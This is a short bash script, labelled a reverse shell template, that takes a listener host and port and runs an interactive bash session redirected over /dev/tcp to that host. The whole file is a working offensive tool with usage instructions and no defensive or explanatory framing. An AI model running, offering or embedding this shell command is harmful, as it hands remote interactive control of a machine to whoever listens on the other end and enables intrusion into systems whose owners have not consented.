#!/bin/bash
# Quick Reverse Shell Template
# Usage: ./quick_reverse.sh <LHOST> <LPORT>

LHOST=${1:-127.0.0.1}
LPORT=${2:-4444}

echo "Connecting to $LHOST:$LPORT..."
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
